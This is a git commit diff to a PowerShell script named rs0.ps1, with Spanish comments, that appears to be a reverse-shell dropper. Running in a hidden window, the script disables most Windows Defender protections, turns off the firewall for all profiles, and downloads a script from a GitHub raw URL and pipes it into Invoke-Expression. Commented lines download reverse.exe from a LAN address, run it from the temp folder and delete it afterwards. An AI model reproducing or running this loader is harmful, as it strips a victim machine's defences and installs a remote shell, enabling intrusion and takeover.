c5e975da642557d7879c52592b1310f35ec02be4
Pancracio <38768857+Chapelo@users.noreply.github.com>
2024-07-12 20:23:02 +0200

    Update rs0.ps1

--- rs0.ps1
+++ rs0.ps1
@@ -5,7 +5,7 @@ PowerShell.exe -WindowStyle hidden {
     Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -EnableControlledFolderAccess Disabled;
     # Agregar exclusion, desactivar Firewall, descargar y ejecutar shell.
     netsh advfirewall set allprofiles state off;
-    # Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
+    # Add-MpPreference -ExclusionPath "$env:TEMP" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
     irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3.ps1 | iex;
     # Eliminar Shell
     # Remove-Item  $env:temp\rs.exe -Force -Recurse;
